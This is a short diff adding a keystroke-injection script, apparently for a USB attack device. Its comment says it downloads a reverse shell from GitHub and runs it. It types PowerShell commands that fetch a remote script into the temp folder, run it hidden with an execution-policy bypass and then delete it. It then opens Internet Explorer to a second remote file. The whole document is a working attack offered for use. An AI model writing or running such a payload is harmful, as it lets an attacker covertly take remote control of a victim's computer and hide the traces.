@@ -1,0 +1,25 @@
+REM Script to download reverse shell from github and run it
+DEFAULT_DELAY 350
+GUI r
+STRINGLN powershell
+DELAY 500
+STRINGLN (Invoke-WebRequest -Uri https://raw.githubusercontent.com/frankcogswell/elementarytroubledgigahertz/main/runner.ps1).Content > $env:temp/adfsggdfs.ps1
+DELAY 1000
+STRINGLN Start-Process powershell.exe -bypass -windowstyle hidden $env:temp/adfsggdfs.ps1
+DELAY 1000
+STRINGLN del $env:temp/adfsggdfs.ps1
+STRINGLN exit
+DELAY 1000
+GUI r
+STRINGLN iexplore.exe
+DELAY 1000
+CTRL t
+STRINGLN https://raw.githubusercontent.com/frankcogswell/elementarytroubledgigahertz/main/host.json
+DELAY 1000
+CTRL q
+LED
+DELAY 333
+LED
+DELAY 333
+LED
+DELAY 333
